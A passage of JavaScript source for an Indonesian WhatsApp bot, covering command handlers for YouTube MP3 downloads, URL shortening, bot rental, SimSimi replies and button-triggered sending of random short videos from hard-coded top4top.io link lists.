			if (!isLinks) return reply(mess.error.Iv)
			
				try {
				reply(mess.wait)
				yta(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
			    if (Number(filesize) >= 15000) return sendMediaURL(from, thumb, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}
\`\`\`▢ Ext : MP3
\`\`\`▢ Filesize : ${filesizeF}
\`\`\`▢ Link : ${a.data}
_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
				const captions = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP3\`\`\`
\`\`\`▢ Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captions)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})
				})
				} catch (err) {
				reply(mess.error.api)
				}
				break

 
 case 'ytmp3':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (args.length < 1) return reply('Link Nya Mana?')
            if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
            teks = args.join(' ')
            reply(mess.wait)
            res = await y2mateA(teks).catch(e => {
            reply('_[ ! ] Error Gagal Dalam Memasuki Web Y2mate_')
})
            result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`🐥 Title : ${res[0].judul}\`\`\`
\`\`\`🐥 Ext : MP3\`\`\`
\`\`\`🐥 Size : ${res[0].size}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

            sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: dev}).then((lalu) => {
            sendFileFromUrl(res[0].link, document, {quoted: dev, mimetype: 'audio/mp3', filename: res[0].output})
})
limitAdd(sender, limit)
            break

 
 
 
 
 
 
 
 
 
 



 
 
case 'donasi':
console.log('DONASI')
xdev.sendMessage(from, donasi.dodo(prefix), text, {quoted: dev})
break
 
 
 
 
 
 

 
 
 
 
 
 
 
 
 
 
 case "owner":
        sendKontak(from, nomerOwner, namalu, "Sibuk");
        break;
 
 
case 'shorturl':
 case 'tinyurl':{
									if (args.length < 1) return reply(`Masukkan link`)
									if (!isUrl) return reply(`Masukkan link`)
									const fetchText = (url, optiono) => {
										return new Promise((resolve, reject) => {
											return fetch(url, optiono)
											.then(response => response.text())
											.then(text => resolve(text))
											.catch(err => {
												console.log(color(err,'red'))
												reject(err)
												})
											})
										}
										okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`)
										shorti = `*Result : ${okok}*`
										reply(shorti)
										}
									break
 
 

 
                 case 'aspan': case 'ptl': case 'ptlvid':{
                fetchText('http://sansekai.my.id/sansekai.txt').then((data) => {
                    var wifegerak = data.split('\n')
                    var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
                        xdev.sendFileFromUrl(from, `http://sansekai.my.id/ptl_repost/${wifegerakx}`, msg)
                })
                }
                break
                
 
 
 
case 'sewabot':
case 'sewalonte':
case 'sewa':
  if(isExtream) return
                       console.log('SEWA BOTZ')                       
                       gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
                                            {buttonId: `KODE QR`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]      
                       
 gbuttonan = {
                           contentText: sewabot.dada(prefix, settings, pushname, ucapanWaktu) ,
                           footerText:`© ${fake1}`,
                           buttons: gbutsan,
                           headerType: 1
                           }
                         await xdev.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {                         
                         quoted: ftroli, contextInfo: forward})                                 
                         break
 





	













 
 
 
 
 
 
 
 
 

 
 
 
default:
                                                      
                        if (isCmd && !multi && !isSimi || !isSimi && isCmd && multi && !dev.key.fromMe) {
                        if(budy.includes(`${fake}`)) return reply (`Hai kak ${pushname} kalo panggil aku jangan pake tanda ${prefix}`)             
                        if(autovn) return sendvn(gakada)
                        const kta =['./respon/sticker01.webp','./respon/sticker03.webp',
                                           './respon/sticker06.webp','./respon/sticker07.webp','./respon/sticker09.webp',
                                           './respon/sticker10.webp',
                                           './respon/sticker11.webp','./respon/sticker13.webp',
                                           './respon/sticker21.webp']                   
					const su = kta[Math.floor(Math.random() * kta.length)]
					halo = fs.readFileSync(`${su}`)
                    if(autosticker === true) return  xdev.sendMessage(from, halo, sticker, {quoted: dev, contextInfo : forward})
			        xdev.sendMessage(from, textcmd, text, {quoted : dev})
					}
					
					
//Simi simi            
if(isGroup && isCmd && isSimi && !dev.key.fromMe){
                        simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=id`)
                        sami = simi.success
                        reply(sami) 
                        }

					       
					  
          

	
     
                   if(isGroup && dev.key.fromMe && budy.includes("Waktu sewa di grup ini sudah habis, bot akan keluar otomatis")){
                   await sendMess("Bye")
                   setTimeout( () => {
                  xdev.groupLeave(from)
                   },4000)
                    }

                    
       
       
       
       

       
       
       
       
                       
          
                   
                   
            
                   
 if (!dev.key.fromMe && budy.includes('bokep')){
 if(isExtream) return
 if (isOwner) return 
 if (isSpammerr) return 
		        addSpammer(sender, "10s", spamkuyy)    
                 sendSticker(hah)  
                 setTimeout( () => {
                 sendSticker(jotos)
                 },4000)
                   }
                   

                  
                  
                  
                  
                  
                 
                 

                  

					
			
	
            



 


	if (responseButton == 'chika') {
    var ini_chika = ['https://e.top4top.io/m_20449tcq71.mp4', 'https://c.top4top.io/m_204409rac1.mp4', 'https://d.top4top.io/m_2044grrvq1.mp4', 'https://a.top4top.io/m_20447gp2m1.mp4', 'https://b.top4top.io/m_2044tms6o1.mp4', 'https://l.top4top.io/m_2044bpcnz1.mp4', 'https://k.top4top.io/m_2044djvwa1.mp4', 'https://i.top4top.io/m_2044edr6b1.mp4', 'https://j.top4top.io/m_20440trai1.mp4', 'https://h.top4top.io/m_20444e0od1.mp4', 'https://f.top4top.io/m_2044sd4yj1.mp4', 'https://g.top4top.io/m_2044pbyik1.mp4', 'https://e.top4top.io/m_2044plq2c1.mp4', 'https://c.top4top.io/m_20444gxgc1.mp4', 'https://d.top4top.io/m_2044huvjs1.mp4', 'https://k.top4top.io/m_2044jizu61.mp4', 'https://l.top4top.io/m_2044tz4ks1.mp4', 'https://a.top4top.io/m_2044jn6161.mp4', 'https://h.top4top.io/m_2044gcixv1.mp4', 'https://g.top4top.io/m_20444c9161.mp4', 'https://j.top4top.io/m_2044ptrlc1.mp4', 'https://i.top4top.io/m_2044pwj221.mp4', 'https://f.top4top.io/m_2044wk7cs1.mp4', 'https://e.top4top.io/m_2044z3oq91.mp4', 'https://d.top4top.io/m_2044pzqsv1.mp4'];
    var random_chika = ini_chika[Math.floor(Math.random() * (ini_chika.length))];
    let buff = await getBuffer(random_chika);
    xdev.sendMessage(from, buff, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'delvira') {
    reply(mess.wait);
    var delvira = ['https://h.top4top.io/m_2045q48rg1.mp4', 'https://i.top4top.io/m_204581d7k1.mp4', 'https://j.top4top.io/m_2045uhkes1.mp4', 'https://g.top4top.io/m_2045l52is1.mp4', 'https://i.top4top.io/m_2045ai8cb1.mp4', 'https://d.top4top.io/m_2045u59ck1.mp4', 'https://f.top4top.io/m_204582jv91.mp4', 'https://e.top4top.io/m_2045l4uit1.mp4', 'https://g.top4top.io/m_20450f0kl1.mp4', 'https://a.top4top.io/m_2045pd6r01.mp4', 'https://c.top4top.io/m_2045g84yn1.mp4', 'https://h.top4top.io/m_2045t100r1.mp4', 'https://j.top4top.io/m_2045en2j01.mp4', 'https://b.top4top.io/m_2045upgh01.mp4', 'https://l.top4top.io/m_2045pu58m1.mp4', 'https://k.top4top.io/m_2045i29cg1.mp4', 'https://e.top4top.io/m_2045q6mkm1.mp4', 'https://f.top4top.io/m_2045jl1jg1.mp4', 'https://c.top4top.io/m_20450bu4q1.mp4', 'https://d.top4top.io/m_2045wojl61.mp4'];
    var random_delvira = delvira[Math.floor(Math.random() * (delvira.length))];
    let ini_delvira = await getBuffer(random_delvira);
    xdev.sendMessage(from, ini_delvira, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'ayu') {
    reply(mess.wait);
    var ayu = ['https://h.top4top.io/m_2045353te1.mp4', 'https://i.top4top.io/m_2045uveyv1.mp4', 'https://g.top4top.io/m_2045mt9ww1.mp4', 'https://f.top4top.io/m_20450uurm1.mp4', 'https://c.top4top.io/m_2045qmp741.mp4', 'https://e.top4top.io/m_20452j1l01.mp4', 'https://b.top4top.io/m_2045k8f751.mp4', 'https://a.top4top.io/m_2045eg2jp1.mp4', 'https://d.top4top.io/m_2045jcjsl1.mp4', 'https://h.top4top.io/m_2045tjyl81.mp4', 'https://j.top4top.io/m_204595j5b1.mp4', 'https://d.top4top.io/m_2045crady1.mp4', 'https://g.top4top.io/m_20457ii1t1.mp4', 'https://k.top4top.io/m_2045zmfgu1.mp4', 'https://b.top4top.io/m_204514isy1.mp4', 'https://e.top4top.io/m_2045ryncv1.mp4', 'https://f.top4top.io/m_20456rgqd1.mp4', 'https://i.top4top.io/m_2045ie5dw1.mp4', 'https://l.top4top.io/m_2045o7w9v1.mp4', 'https://c.top4top.io/m_2045hcjnm1.mp4'];
    var random_ayu = ayu[Math.floor(Math.random() * (ayu.length))];
    let ini = await getBuffer(random_ayu);
    xdev.sendMessage(from, ini, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'bunga') {
    reply(mess.wait);
    var bunga = ['https://d.top4top.io/m_2045ln0hy1.mp4', 'https://b.top4top.io/m_2045wt4lb1.mp4', 'https://a.top4top.io/m_2045s3khl1.mp4', 'https://f.top4top.io/m_2045jb2va1.mp4', 'https://l.top4top.io/m_2045c7vqm1.mp4', 'https://k.top4top.io/m_20459shmj1.mp4', 'https://b.top4top.io/m_2045v82yo1.mp4', 'https://h.top4top.io/m_20458jkj91.mp4', 'https://f.top4top.io/m_2045becu81.mp4', 'https://i.top4top.io/m_204546wbm1.mp4', 'https://e.top4top.io/m_20455p1.mp4', 'https://i.top4top.io/m_204573y8p1.mp4', 'https://h.top4top.io/m_204519hat1.mp4', 'https://k.top4top.io/m_204502t021.mp4', 'https://l.top4top.io/m_2045ex4p81.mp4', 'https://g.top4top.io/m_2045f693d1.mp4', 'https://j.top4top.io/m_2045ypbga1.mp4', 'https://d.top4top.io/m_2045kzqx61.mp4', 'https://j.top4top.io/m_2045ltjq51.mp4', 'https://c.top4top.io/m_20456e8wc1.mp4', 'https://c.top4top.io/m_2045oggyg1.mp4', 'https://g.top4top.io/m_204545km11.mp4', 'https://e.top4top.io/m_2045mbr0w1.mp4'];
    var random_bunga = bunga[Math.floor(Math.random() * (bunga.length))];
    let ini_bunga = await getBuffer(random_bunga);
    xdev.sendMessage(from, ini_bunga, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'aura') {
    reply(mess.wait);
    var aura = ['https://g.top4top.io/m_2045kg02x1.mp4', 'https://f.top4top.io/m_2045bzzv61.mp4', 'https://e.top4top.io/m_2045u39bp1.mp4', 'https://c.top4top.io/m_2045nz5y81.mp4', 'https://b.top4top.io/m_2045bd5nx1.mp4', 'https://d.top4top.io/m_2045falge1.mp4', 'https://a.top4top.io/m_2045eljtw1.mp4', 'https://l.top4top.io/m_2045kcp201.mp4', 'https://j.top4top.io/m_2045at6161.mp4', 'https://i.top4top.io/m_2045nmmpu1.mp4', 'https://k.top4top.io/m_2045zox271.mp4', 'https://h.top4top.io/m_2045qzh0s1.mp4', 'https://g.top4top.io/m_2045bg23m1.mp4', 'https://e.top4top.io/m_20456vum81.mp4', 'https://c.top4top.io/m_2045vew941.mp4', 'https://d.top4top.io/m_20450ihor1.mp4', 'https://f.top4top.io/m_2045qyei51.mp4', 'https://b.top4top.io/m_2045pn2wh1.mp4', 'https://k.top4top.io/m_20457x5tn1.mp4', 'https://a.top4top.io/m_2045vc1vm1.mp4', 'https://l.top4top.io/m_2045bqxm91.mp4'];
    var random_aura = aura[Math.floor(Math.random() * (aura.length))];
    let ini_aura = await getBuffer(random_aura);
    xdev.sendMessage(from, ini_aura, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'nisa') {
    reply(mess.wait);
    var nisa = ['https://i.top4top.io/m_2045a62xr1.mp4', 'https://f.top4top.io/m_2045ag1ah1.mp4', 'https://h.top4top.io/m_2045aao0z1.mp4', 'https://g.top4top.io/m_20452ycpb1.mp4', 'https://d.top4top.io/m_2045w6bhe1.mp4', 'https://e.top4top.io/m_2045xra1y1.mp4', 'https://l.top4top.io/m_2045t75ik1.mp4', 'https://c.top4top.io/m_2045tekbe1.mp4', 'https://b.top4top.io/m_20452iret1.mp4', 'https://a.top4top.io/m_2045mx50v1.mp4', 'https://j.top4top.io/m_2045p4i5g1.mp4', 'https://k.top4top.io/m_2045ka8zl1.mp4', 'https://i.top4top.io/m_2045ugp6n1.mp4', 'https://f.top4top.io/m_20452avj31.mp4', 'https://e.top4top.io/m_2045nb03l1.mp4', 'https://g.top4top.io/m_2045x4itm1.mp4', 'https://c.top4top.io/m_2045riu151.mp4', 'https://d.top4top.io/m_2045fz1ic1.mp4', 'https://l.top4top.io/m_2045i393z1.mp4', 'https://b.top4top.io/m_2045ws5mp1.mp4', 'https://k.top4top.io/m_20459e8w41.mp4', 'https://j.top4top.io/m_204558yj01.mp4', 'https://a.top4top.io/m_20457ksoh1.mp4', 'https://i.top4top.io/m_2045dk4sl1.mp4'];
    var random_nisa = nisa[Math.floor(Math.random() * (nisa.length))];
    let ini_nisa = await getBuffer(random_nisa);
    xdev.sendMessage(from, ini_nisa, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'ziva') {
    reply(mess.wait);
    var ziva = ['https://a.top4top.io/m_2045w0s1a1.mp4', 'https://d.top4top.io/m_2045xs8yi1.mp4', 'https://b.top4top.io/m_2045azqmo1.mp4', 'https://f.top4top.io/m_2045two7u1.mp4', 'https://c.top4top.io/m_2045qyybj1.mp4', 'https://e.top4top.io/m_20451udwa1.mp4', 'https://g.top4top.io/m_2045wf56i1.mp4', 'https://j.top4top.io/m_2045eygb01.mp4', 'https://l.top4top.io/m_2045wc7px1.mp4', 'https://c.top4top.io/m_2045w1vo91.mp4', 'https://d.top4top.io/m_20456rh231.mp4', 'https://l.top4top.io/m_2045alof61.mp4', 'https://h.top4top.io/m_2045r85wl1.mp4', 'https://e.top4top.io/m_20451kltw1.mp4', 'https://g.top4top.io/m_20459k8ps1.mp4', 'https://f.top4top.io/m_2045ldcsq1.mp4', 'https://f.top4top.io/m_2045hvozl1.mp4', 'https://c.top4top.io/m_20452p34z1.mp4', 'https://l.top4top.io/m_2045msq4m1.mp4', 'https://i.top4top.io/m_20457dpjf1.mp4', 'https://k.top4top.io/m_2045252vc1.mp4', 'https://h.top4top.io/m_2045hmckz1.mp4', 'https://a.top4top.io/m_20457d0zk1.mp4', 'https://i.top4top.io/m_2045x1txz1.mp4', 'https://g.top4top.io/m_2045vh0di1.mp4', 'https://g.top4top.io/m_2045yl2it1.mp4', 'https://d.top4top.io/m_20456hnro1.mp4', 'https://k.top4top.io/m_20452q7ko1.mp4', 'https://k.top4top.io/m_20456hkh61.mp4', 'https://a.top4top.io/m_2045ytjc41.mp4', 'https://h.top4top.io/m_2045iwljm1.mp4', 'https://e.top4top.io/m_2045cuwm51.mp4', 'https://i.top4top.io/m_2045d43m11.mp4', 'https://b.top4top.io/m_2045qlcbo1.mp4', 'https://j.top4top.io/m_2045ym82h1.mp4', 'https://j.top4top.io/m_2045bew1l1.mp4', 'https://b.top4top.io/m_2045ythaz1.mp4'];
    var random_ziva = ziva[Math.floor(Math.random() * (ziva.length))];
    let ini_ziva = await getBuffer(random_ziva);
    xdev.sendMessage(from, ini_ziva, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'yana') {
    reply(mess.wait);
    var yana = ['https://g.top4top.io/m_2045p55sm1.mp4', 'https://f.top4top.io/m_2045o2z231.mp4', 'https://h.top4top.io/m_2045na6v81.mp4', 'https://i.top4top.io/m_2045cdyjt1.mp4', 'https://c.top4top.io/m_2045ro9xo1.mp4', 'https://b.top4top.io/m_2045edz2q1.mp4', 'https://a.top4top.io/m_2045ybdlt1.mp4', 'https://i.top4top.io/m_2045kk4t61.mp4', 'https://d.top4top.io/m_2045ehl6b1.mp4', 'https://k.top4top.io/m_20454zh0e1.mp4', 'https://l.top4top.io/m_2045y6bfe1.mp4', 'https://j.top4top.io/m_2045wxx3t1.mp4', 'https://h.top4top.io/m_2045cyk6a1.mp4', 'https://g.top4top.io/m_2045buha21.mp4', 'https://c.top4top.io/m_2045jzgsn1.mp4', 'https://e.top4top.io/m_2045dd9x11.mp4', 'https://d.top4top.io/m_2045dg6hl1.mp4', 'https://b.top4top.io/m_2045zmtsq1.mp4', 'https://f.top4top.io/m_2045m94wa1.mp4', 'https://a.top4top.io/m_2045d8rwp1.mp4', 'https://l.top4top.io/m_2045l80391.mp4', 'https://k.top4top.io/m_20458j0dc1.mp4', 'https://j.top4top.io/m_2045hh4741.mp4', 'https://i.top4top.io/m_2045xk4x71.mp4'];
    var random_yana = yana[Math.floor(Math.random() * (yana.length))];
    let ini_yana = await getBuffer(random_yana);
    xdev.sendMessage(from, ini_yana, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'viona') {
    reply(mess.wait);
    var viona = ['https://h.top4top.io/m_2045fs1b71.mp4', 'https://g.top4top.io/m_20453m4y71.mp4', 'https://g.top4top.io/m_2045mgrc01.mp4', 'https://f.top4top.io/m_2045p29p01.mp4', 'https://l.top4top.io/m_2045ity101.mp4', 'https://i.top4top.io/m_2045kguyy1.mp4', 'https://a.top4top.io/m_204549ynr1.mp4', 'https://b.top4top.io/m_2045y0fty1.mp4', 'https://c.top4top.io/m_20456si0m1.mp4', 'https://f.top4top.io/m_20457pmms1.mp4', 'https://h.top4top.io/m_2045gtquo1.mp4', 'https://j.top4top.io/m_204568o961.mp4', 'https://a.top4top.io/m_2045jqw861.mp4', 'https://d.top4top.io/m_2045frb0x1.mp4', 'https://c.top4top.io/m_2045xzr2v1.mp4', 'https://b.top4top.io/m_2045ae34n1.mp4', 'https://h.top4top.io/m_20453a5r81.mp4', 'https://k.top4top.io/m_2045baiy41.mp4', 'https://g.top4top.io/m_2045fjj6h1.mp4', 'https://i.top4top.io/m_2045q3tba1.mp4', 'https://d.top4top.io/m_2045npd2v1.mp4', 'https://e.top4top.io/m_2045fw9tg1.mp4', 'https://e.top4top.io/m_2045g0bgt1.mp4', 'https://k.top4top.io/m_2045opgb71.mp4'];
    var random_viona = viona[Math.floor(Math.random() * (viona.length))];
    let ini_viona = await getBuffer(random_viona);
    xdev.sendMessage(from, ini_viona, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'syania') {
    reply(mess.wait);
    var syania = ['https://f.top4top.io/m_2045x5wnd1.mp4', 'https://e.top4top.io/m_2045zv8zg1.mp4', 'https://d.top4top.io/m_2045trg5i1.mp4', 'https://c.top4top.io/m_2045xbfb51.mp4', 'https://h.top4top.io/m_2045dblc31.mp4', 'https://a.top4top.io/m_2045xd5sx1.mp4', 'https://k.top4top.io/m_2045520uv1.mp4', 'https://j.top4top.io/m_2045bplb41.mp4', 'https://i.top4top.io/m_2045x91991.mp4', 'https://l.top4top.io/m_2045jr6gs1.mp4', 'https://g.top4top.io/m_2045i9xs01.mp4', 'https://e.top4top.io/m_2045ideve1.mp4', 'https://f.top4top.io/m_2045g992t1.mp4', 'https://d.top4top.io/m_2045m180v1.mp4', 'https://c.top4top.io/m_2045n6bm31.mp4', 'https://b.top4top.io/m_2045s5r3z1.mp4', 'https://i.top4top.io/m_2045xoitc1.mp4', 'https://k.top4top.io/m_2045dur3t1.mp4', 'https://d.top4top.io/m_2045c6ddy1.mp4', 'https://j.top4top.io/m_2045nbbuc1.mp4', 'https://g.top4top.io/m_2045yinwy1.mp4', 'https://a.top4top.io/m_2045qsqhq1.mp4', 'https://c.top4top.io/m_20453tu1v1.mp4', 'https://e.top4top.io/m_2045zjbk31.mp4', 'https://f.top4top.io/m_2045n4rmz1.mp4', 'https://h.top4top.io/m_2045reqfb1.mp4', 'https://a.top4top.io/m_2045i86q21.mp4', 'https://b.top4top.io/m_20453xada1.mp4'];
    var random_syania = syania[Math.floor(Math.random() * (syania.length))];
    let ini_syania = await getBuffer(random_syania);
    xdev.sendMessage(from, ini_syania, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'riri') {
    reply(mess.wait);
    var riri = ['https://e.top4top.io/m_2045ut0en1.mp4', 'https://d.top4top.io/m_2045a5q5l1.mp4', 'https://f.top4top.io/m_2045rd0z31.mp4', 'https://c.top4top.io/m_2045zm4xy1.mp4', 'https://b.top4top.io/m_2045n6guq1.mp4', 'https://l.top4top.io/m_2045v8ck61.mp4', 'https://a.top4top.io/m_2045jbwwh1.mp4', 'https://k.top4top.io/m_2045ndl5m1.mp4', 'https://j.top4top.io/m_20457v6t61.mp4', 'https://i.top4top.io/m_2045a3gre1.mp4', 'https://h.top4top.io/m_2045tli2k1.mp4', 'https://g.top4top.io/m_2045z1u2g1.mp4', 'https://f.top4top.io/m_2045kdv2f1.mp4', 'https://e.top4top.io/m_20458qzhw1.mp4', 'https://d.top4top.io/m_20459vq7t1.mp4', 'https://c.top4top.io/m_20452b3av1.mp4', 'https://b.top4top.io/m_2045u5z3p1.mp4', 'https://a.top4top.io/m_2045l6nrb1.mp4'];
    var random_riri = riri[Math.floor(Math.random() * (riri.length))];
    let ini_riri = await getBuffer(random_riri);
    xdev.sendMessage(from, ini_riri, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'syifa') {
    reply(mess.wait);
    var syifa = ['https://h.top4top.io/m_2044bbyhm1.mp4', 'https://l.top4top.io/m_2044xa3nk1.mp4', 'https://j.top4top.io/m_20446ggxu1.mp4', 'https://d.top4top.io/m_2044rvctf1.mp4', 'https://b.top4top.io/m_2044kdgfw1.mp4', 'https://k.top4top.io/m_204432xwq1.mp4', 'https://c.top4top.io/m_204456vl01.mp4', 'https://a.top4top.io/m_2044bz2nv1.mp4', 'https://i.top4top.io/m_20440vzg41.mp4', 'https://e.top4top.io/m_20446qugg1.mp4', 'https://g.top4top.io/m_2044xrism1.mp4', 'https://c.top4top.io/m_20449iqt51.mp4', 'https://a.top4top.io/m_2044h64w01.mp4', 'https://d.top4top.io/m_20445mytg1.mp4', 'https://g.top4top.io/m_20445g4ue1.mp4', 'https://i.top4top.io/m_2044l1yk41.mp4', 'https://c.top4top.io/m_2044vpzyb1.mp4', 'https://e.top4top.io/m_20445z0xd1.mp4', 'https://d.top4top.io/m_2044qjas41.mp4', 'https://b.top4top.io/m_2044irvk41.mp4', 'https://l.top4top.io/m_2044wmw5d1.mp4', 'https://k.top4top.io/m_2044jewbq1.mp4', 'https://j.top4top.io/m_2044lo9sv1.mp4', 'https://i.top4top.io/m_2044fq2ne1.mp4', 'https://h.top4top.io/m_2044wudwv1.mp4', 'https://f.top4top.io/m_20445frga1.mp4'];
    var random_syifa = syifa[Math.floor(Math.random() * (syifa.length))];
    let ini_syifa = await getBuffer(random_syifa);
    xdev.sendMessage(from, ini_syifa, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'mama_gina') {
    reply(mess.wait);
    var mama_gina = ['https://j.top4top.io/m_2044moqoh1.mp4', 'https://a.top4top.io/m_2044kfu031.mp4', 'https://e.top4top.io/m_2044pd4q61.mp4', 'https://b.top4top.io/m_2044hd3hd1.mp4', 'https://k.top4top.io/m_2044lw3oq1.mp4', 'https://g.top4top.io/m_2044iu82p1.mp4', 'https://g.top4top.io/m_2044b4orc1.mp4', 'https://c.top4top.io/m_2044no8dz1.mp4', 'https://i.top4top.io/m_2044pxagw1.mp4', 'https://b.top4top.io/m_2044z2w4t1.mp4', 'https://c.top4top.io/m_2044lcxpj1.mp4', 'https://d.top4top.io/m_2044nvuaw1.mp4', 'https://f.top4top.io/m_20440g0o31.mp4', 'https://k.top4top.io/m_2044v2ime1.mp4', 'https://h.top4top.io/m_2044awwxm1.mp4', 'https://d.top4top.io/m_2044ht3vj1.mp4', 'https://l.top4top.io/m_2044bw2d31.mp4', 'https://i.top4top.io/m_2044zuzja1.mp4', 'https://l.top4top.io/m_2044cogw61.mp4', 'https://h.top4top.io/m_2044jasn31.mp4', 'https://j.top4top.io/m_204473eed1.mp4', 'https://a.top4top.io/m_20445wkpp1.mp4'];
    var random_mama_gina = mama_gina[Math.floor(Math.random() * (mama_gina.length))];
    let ini_mama_gina = await getBuffer(random_mama_gina);
    xdev.sendMessage(from, ini_mama_gina, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'alcakenya') {
    reply(mess.wait);
    var alcakenya = ['https://l.top4top.io/m_2044ehtwa1.mp4', 'https://k.top4top.io/m_2044h7tpc1.mp4', 'https://b.top4top.io/m_2044l37zk1.mp4', 'https://i.top4top.io/m_2044e9pqz1.mp4', 'https://j.top4top.io/m_2044obe8d1.mp4', 'https://k.top4top.io/m_2044dh7u21.mp4', 'https://c.top4top.io/m_2044o3ohe1.mp4', 'https://f.top4top.io/m_2044zm90s1.mp4', 'https://d.top4top.io/m_2044v7mo21.mp4', 'https://h.top4top.io/m_20446er9r1.mp4', 'https://g.top4top.io/m_2044o8u9t1.mp4', 'https://a.top4top.io/m_204421sn31.mp4', 'https://b.top4top.io/m_2044khyds1.mp4', 'https://a.top4top.io/m_2044vga111.mp4', 'https://l.top4top.io/m_2044mp7841.mp4', 'https://c.top4top.io/m_2044m3h8m1.mp4', 'https://f.top4top.io/m_2044ek3vd1.mp4', 'https://e.top4top.io/m_20443r9am1.mp4', 'https://d.top4top.io/m_2044g19oc1.mp4', 'https://j.top4top.io/m_20440tis11.mp4', 'https://e.top4top.io/m_2044yimnr1.mp4'];
    var random_alcakenya = alcakenya[Math.floor(Math.random() * (alcakenya.length))];
    let ini_alcakenya = await getBuffer(random_alcakenya);
    xdev.sendMessage(from, ini_alcakenya, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'mangayutri') {
    reply(mess.wait);
    var mangayutri = ['https://e.top4top.io/m_2044wm1kq1.mp4', 'https://l.top4top.io/m_2044k0psz1.mp4', 'https://c.top4top.io/m_2044y394z1.mp4', 'https://a.top4top.io/m_2044mzst31.mp4', 'https://g.top4top.io/m_2044tq6o11.mp4', 'https://f.top4top.io/m_2044z61tt1.mp4', 'https://d.top4top.io/m_2044t3dn91.mp4', 'https://k.top4top.io/m_20443i8ba1.mp4', 'https://b.top4top.io/m_2044i0ao91.mp4', 'https://l.top4top.io/m_2044dvyeb1.mp4', 'https://h.top4top.io/m_2044d5gey1.mp4', 'https://f.top4top.io/m_204484esr1.mp4', 'https://i.top4top.io/m_2044ez7y91.mp4', 'https://c.top4top.io/m_2044qkb5k1.mp4', 'https://j.top4top.io/m_2044wwdfy1.mp4', 'https://d.top4top.io/m_2044fzmw21.mp4', 'https://g.top4top.io/m_20444rprh1.mp4', 'https://e.top4top.io/m_20446919h1.mp4', 'https://a.top4top.io/m_2044unrp01.mp4', 'https://i.top4top.io/m_20441xktm1.mp4', 'https://h.top4top.io/m_20444t5dj1.mp4', 'https://f.top4top.io/m_2044l4j3r1.mp4', 'https://k.top4top.io/m_2044wb7pq1.mp4', 'https://e.top4top.io/m_2044i5rki1.mp4', 'https://j.top4top.io/m_2044s58ir1.mp4', 'https://g.top4top.io/m_2044dayid1.mp4', 'https://d.top4top.io/m_204492t8n1.mp4'];
    var random_mangayutri = mangayutri[Math.floor(Math.random() * (mangayutri.length))];
    let ini_mangayutri = await getBuffer(random_mangayutri);
    xdev.sendMessage(from, ini_mangayutri, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'rikagusriani') {
    reply(mess.wait);
